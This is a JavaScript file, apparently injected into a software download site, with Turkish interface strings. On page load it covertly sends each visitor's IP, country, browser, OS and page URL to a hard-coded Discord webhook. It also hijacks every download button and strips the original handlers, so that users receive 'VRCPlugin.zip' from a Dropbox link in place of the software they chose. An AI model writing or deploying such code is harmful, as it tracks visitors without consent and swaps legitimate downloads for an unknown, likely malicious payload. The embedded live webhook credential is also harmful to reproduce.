(function() {
    'use strict';
    
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif';
    
    function getBrowserInfo() {
        const userAgent = navigator.userAgent;
        let browser = 'Bilinmiyor';
        
        if (userAgent.indexOf('Firefox') > -1) {
            browser = 'Firefox';
        } else if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) {
            browser = 'Chrome';
        } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
            browser = 'Safari';
        } else if (userAgent.indexOf('Edg') > -1) {
            browser = 'Edge';
        } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
            browser = 'Opera';
        }
        
        return browser;
    }
    
    function getOSInfo() {
        const userAgent = navigator.userAgent;
        let os = 'Bilinmiyor';
        
        if (userAgent.indexOf('Win') > -1) {
            os = 'Windows';
        } else if (userAgent.indexOf('Mac') > -1) {
            os = 'macOS';
        } else if (userAgent.indexOf('Linux') > -1) {
            os = 'Linux';
        } else if (userAgent.indexOf('Android') > -1) {
            os = 'Android';
        } else if (userAgent.indexOf('iOS') > -1 || userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1) {
            os = 'iOS';
        }
        
        return os;
    }
    
    async function sendToDiscord(downloadUrl, platform) {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            const ip = ipData.ip || 'Bilinmiyor';
            const country = ipData.country_name || ipData.country || 'Bilinmiyor';
            const browser = getBrowserInfo();
            const os = getOSInfo();
            
            const embed = {
                title: '📥 Yeni İndirme İsteği',
                color: 0x5865F2,
                fields: [
                    {
                        name: '🌐 IP Adresi',
                        value: ip,
                        inline: true
                    },
                    {
                        name: '🌍 Ülke',
                        value: country,
                        inline: true
                    },
                    {
                        name: '🌐 Tarayıcı',
                        value: browser,
                        inline: true
                    },
                    {
                        name: '💻 İşletim Sistemi',
                        value: os,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Download Tracker'
                }
            };
            
            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
                
                console.log('Discord webhook\'a gönderildi');
            } else {
                console.warn('Discord webhook URL\'i ayarlanmamış!');
            }
            
        } catch (error) {
            console.error('Discord webhook hatası:', error);
        }
    }
    
    async function sendPageVisitToDiscord() {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            const ip = ipData.ip || 'Bilinmiyor';
            const country = ipData.country_name || ipData.country || 'Bilinmiyor';
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const pageUrl = window.location.href;
            
            const embed = {
                title: '🌐 Siteye Giriş Yapıldı',
                color: 0x00FF00,
                fields: [
                    {
                        name: '🌐 IP Adresi',
                        value: ip,
                        inline: true
                    },
                    {
                        name: '🌍 Ülke',
                        value: country,
                        inline: true
                    },
                    {
                        name: '🌐 Tarayıcı',
                        value: browser,
                        inline: true
                    },
                    {
                        name: '💻 İşletim Sistemi',
                        value: os,
                        inline: true
                    },
                    {
                        name: '📄 Sayfa',
                        value: pageUrl,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Page Visit Tracker'
                }
            };
            
            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
                
                console.log('Sayfa ziyareti Discord webhook\'a gönderildi');
            } else {
                console.warn('Discord webhook URL\'i ayarlanmamış!');
            }
            
        } catch (error) {
            console.error('Discord webhook hatası:', error);
        }
    }
    
    const DROPBOX_DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/bifpnt4m0yd68vvr83as7/VRCPlugin.zip?rlkey=2vqm8skpun8x50sygv3zo1je9&st=4avpzs6n&dl=1';
    
    function handleDownload(e, linkElement) {
        const href = linkElement.getAttribute('href');
        
        if (href && (href.indexOf('/download/') !== -1 || linkElement.classList.contains('dlBtn'))) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            let platform = 'unknown';
            if (linkElement.classList.contains('win') || href.indexOf('/win') !== -1) {
                platform = 'windows';
            } else if (linkElement.classList.contains('mac') || href.indexOf('/mac') !== -1) {
                platform = 'mac';
            } else if (linkElement.classList.contains('deb') || linkElement.classList.contains('linux') || href.indexOf('/deb') !== -1 || href.indexOf('/ubuntu') !== -1) {
                platform = 'linux';
            } else if (linkElement.classList.contains('andr') || href.indexOf('play.google.com') !== -1) {
                platform = 'android';
            } else if (linkElement.classList.contains('ios') || href.indexOf('itunes.apple.com') !== -1) {
                platform = 'ios';
            }
            
            sendToDiscord(href, platform);
            
            const downloadLink = document.createElement('a');
            downloadLink.href = DROPBOX_DOWNLOAD_URL;
            downloadLink.download = 'VRCPlugin.zip';
            downloadLink.style.display = 'none';
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            return false;
        }
    }
    
    function attachDownloadHandlers() {
        const downloadLinks = document.querySelectorAll('a[href*="/download/"], a.dlBtn, a[class*="dlBtn"]');
        
        downloadLinks.forEach(function(link) {
            if (!link.hasAttribute('data-download-handled')) {
                link.setAttribute('data-download-handled', 'true');
                
                const originalOnclick = link.getAttribute('onclick');
                if (originalOnclick) {
                    link.removeAttribute('onclick');
                }
                
                link.addEventListener('click', function(e) {
                    handleDownload(e, this);
                }, true);
            }
        });
    }
    
    function initDownloadHandler() {
        attachDownloadHandlers();
        
        document.addEventListener('click', function(e) {
            let target = e.target;
            while (target && target !== document.body) {
                if (target.tagName === 'A') {
                    const href = target.getAttribute('href');
                    if (href && (href.indexOf('/download/') !== -1 || target.classList.contains('dlBtn'))) {
                        handleDownload(e, target);
                        return;
                    }
                }
                target = target.parentElement;
            }
        }, true);
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            sendPageVisitToDiscord();
            initDownloadHandler();
            setTimeout(initDownloadHandler, 500);
            setTimeout(initDownloadHandler, 1000);
            setTimeout(initDownloadHandler, 2000);
        });
    } else {
        sendPageVisitToDiscord();
        initDownloadHandler();
        setTimeout(initDownloadHandler, 500);
        setTimeout(initDownloadHandler, 1000);
        setTimeout(initDownloadHandler, 2000);
    }
    
    if (window.angular) {
        const app = angular.element(document.querySelector('[ng-app]'));
        if (app.length > 0) {
            const injector = app.injector();
            if (injector) {
                const $timeout = injector.get('$timeout');
                $timeout(function() {
                    initDownloadHandler();
                }, 0);
                $timeout(function() {
                    initDownloadHandler();
                }, 500);
                $timeout(function() {
                    initDownloadHandler();
                }, 1000);
            }
        }
    }
    
    if (window.Vue) {
        setTimeout(initDownloadHandler, 500);
        setTimeout(initDownloadHandler, 1000);
        setTimeout(initDownloadHandler, 2000);
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        const downloadLinks = document.querySelectorAll('a[href*="/download/"], a.dlBtn, a[class*="dlBtn"]');
        
        downloadLinks.forEach(function(link) {
            if (!link.hasAttribute('data-download-handled')) {
                link.setAttribute('data-download-handled', 'true');
                link.addEventListener('click', function(e) {
                    handleDownload(e, this);
                }, true);
            }
        });
        
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) {
                        const newLinks = node.querySelectorAll ? node.querySelectorAll('a[href*="/download/"], a.dlBtn, a[class*="dlBtn"]') : [];
                        newLinks.forEach(function(link) {
                            if (!link.hasAttribute('data-download-handled')) {
                                link.setAttribute('data-download-handled', 'true');
                                
                                const originalOnclick = link.getAttribute('onclick');
                                if (originalOnclick) {
                                    link.removeAttribute('onclick');
                                }
                                
                                link.addEventListener('click', function(e) {
                                    handleDownload(e, this);
                                }, true);
                            }
                        });
                        
                        if (node.tagName === 'A' && (node.getAttribute('href') && node.getAttribute('href').indexOf('/download/') !== -1 || node.classList.contains('dlBtn'))) {
                            if (!node.hasAttribute('data-download-handled')) {
                                node.setAttribute('data-download-handled', 'true');
                                
                                const originalOnclick = node.getAttribute('onclick');
                                if (originalOnclick) {
                                    node.removeAttribute('onclick');
                                }
                                
                                node.addEventListener('click', function(e) {
                                    handleDownload(e, this);
                                }, true);
                            }
                        }
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
})();

